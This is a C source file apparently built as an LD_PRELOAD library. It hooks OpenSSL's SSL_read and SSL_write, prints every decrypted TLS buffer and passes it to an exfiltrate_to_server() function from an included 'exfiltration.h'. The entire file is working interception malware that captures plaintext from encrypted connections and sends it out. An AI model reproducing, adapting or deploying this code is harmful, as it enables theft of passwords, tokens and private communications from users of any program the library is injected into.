#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <openssl/ssl.h>
#include "exfiltration.h"

static int (*original_SSL_read)(SSL *, void *, int) = NULL;
static int (*original_SSL_write)(SSL *, const void *, int) = NULL;

int SSL_read(SSL *ssl, void *buf, int num) {
    if (!original_SSL_read) {
        original_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
    }

    int result = original_SSL_read(ssl, buf, num);

    if (result > 0) {
        printf("[Intercepted SSL_read] Data: %.*s\n", result, (char *)buf);
        exfiltrate_to_server(buf, result);
    }

    return result;
}

int SSL_write(SSL *ssl, const void *buf, int num) {
    if (!original_SSL_write) {
        original_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
    }

    int result = original_SSL_write(ssl, buf, num);

    if (result > 0) {
        printf("[Intercepted SSL_write] Data: %.*s\n", result, (char *)buf);
        exfiltrate_to_server(buf, result);
    }

    return result;
}